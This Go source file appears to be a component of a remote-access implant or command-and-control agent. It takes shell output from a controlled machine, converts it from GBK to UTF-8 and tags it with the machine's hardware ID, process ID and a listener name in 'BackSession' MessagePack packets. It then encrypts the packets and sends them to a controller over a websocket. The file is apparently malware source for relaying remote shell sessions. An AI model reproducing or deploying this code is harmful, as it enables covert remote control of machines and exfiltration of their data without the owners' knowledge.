package Function

import (
	"io/ioutil"
	"main/Encrypt"
	"main/MessagePack"
	"main/PcInfo"
	"strings"

	"github.com/togettoyou/wsc"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

func ConvertGBKToUTF8(s string) (string, error) {
	reader := transform.NewReader(strings.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, err := ioutil.ReadAll(reader)
	if err != nil {
		return "", err
	}
	return string(d), nil
}

func SessionLog[T any](log string, Domain string, Connection T, sendFunc func([]byte, T), unmsgpack *MessagePack.MsgPack) {
	result := ""
	result = string(log)
	utf8Stdout, err := ConvertGBKToUTF8(result)
	if err != nil {
		//Log(err.Error(), Connection, unmsgpack)
		utf8Stdout = err.Error()
	}
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
	msgpack.ForcePathObject("Domain").SetAsString("")
	msgpack.ForcePathObject("Controler_HWID").SetAsString("")
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("Domain").SetAsString(Domain)
	msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.ProcessID + PcInfo.HWID)
	msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout)
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.HWID)
	sendFunc(msgpack.Encode2Bytes(), Connection)
}

func SessionLogA[T any](log string, Domain string, Connection T, sendFunc func([]byte, T), unmsgpack *MessagePack.MsgPack) {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("Domain").SetAsString("")
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
	msgpack.ForcePathObject("ReadInput").SetAsString(log)
	sendFunc(msgpack.Encode2Bytes(), Connection)
}

func SendData(data []byte, Connection *wsc.Wsc) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	Connection.SendBinaryMessage(endata)
}
